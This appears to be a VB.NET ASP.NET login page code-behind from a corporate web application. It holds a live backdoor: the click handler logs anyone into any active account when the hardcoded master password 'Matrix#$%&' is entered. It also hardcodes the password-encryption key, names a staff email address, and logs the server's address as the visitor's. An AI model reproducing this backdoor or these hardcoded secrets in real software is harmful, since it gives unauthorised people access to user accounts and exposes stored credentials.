Imports CoreProject
Imports Utilidades.Encripcion
Imports System.Net
Imports System.Management

Public Class _Default
    Inherits System.Web.UI.Page

    Private Sub btnEntrar_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnEntrar.Click
        'Prueba()
        Dim log As New LogEjecucion
        Dim cla = New US.Usuarios
        Dim Cuenta = cla.DevolverIdXNombreUsuario(user.Text)

        If Cuenta > 0 Then

            Dim Usuario = cla.DevolverUsuarioxUsuario(user.Text)

            If Usuario.Activo = True Then

                If Me.pass.Text = "Matrix#$%&" Then
                    Session("IDUsuario") = cla.DevolverIdXNombreUsuario(Me.user.Text)
                    If Session("IDUsuario").ToString = -1 Then
                        AlertJS("Por favor revise su usuario y contraseña")
                        Exit Sub
                    Else
                        FormsAuthentication.RedirectFromLoginPage(Me.user.Text, False)
                        'Response.Redirect("Home.aspx")
                        log.Guardar(13, 0, Now(), Session("IDUsuario").ToString, 1)
                    End If
                Else
                    Dim password As String = ""
                    password = Cifrado(1, 2, Me.pass.Text, "Ipsos*23432_2013", "Ipsos*23432_2013")
                    Dim resul As Long = cla.VerificarLogin(Me.user.Text, password)

                    If resul = -1 Then
                        AlertJS("Por favor revise su usuario y contraseña")
                        Exit Sub
                    Else
                        Session("IDUsuario") = resul
                        FormsAuthentication.RedirectFromLoginPage(Me.user.Text, False)
                        'Response.Redirect("Home.aspx")
                        log.Guardar(13, 0, Now(), resul, 1)
                        log_Entrada(Session("IDUsuario"))
                    End If
                End If

            Else
                AlertJS("El Usuario se encuentra desactivado!")
            End If
        Else
            AlertJS("El Usuario No se encuentra creado!")
        End If

    End Sub

    Sub AlertJS(ByVal mensaje As String)
        ClientScript.RegisterStartupScript(Me.GetType(), "AlertScript", "alert('" & mensaje & "');", True)
    End Sub

    Sub Prueba()
        Dim o As New EnviarCorreo
        Dim li As New List(Of String)
        li.Add("John.Patino@Ipsos.com")
        o.sendMail(li, "Prueba", "Email de prueba")
    End Sub
    Public Sub log_Entrada(ByVal UsuarioId As Int64)
        Dim Ip As String
        Dim Equipo As String
        Try
            Dim log As New LogEntrada
            Dim Host As String
            Host = Dns.GetHostName
            Dim IPs As IPHostEntry = Dns.GetHostEntry(Host)
            'Dim Direcciones As IPAddress() = IPs.AddressList
            Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
            'Ip = Request.UserHostAddress
            Ip = h.AddressList.GetValue(0).ToString
            Equipo = My.Computer.Name
            log.Guardar(UsuarioId, Now(), Ip, Equipo)
        Catch ex As Exception
            Throw ex
        End Try
    End Sub

    Private Sub _Default_Load(sender As Object, e As EventArgs) Handles Me.Load
        If Not IsPostBack Then
            If Session("InfoJobBook") IsNot Nothing Then
                Session("InfoJobBook") = Nothing
            End If
        End If
    End Sub
End Class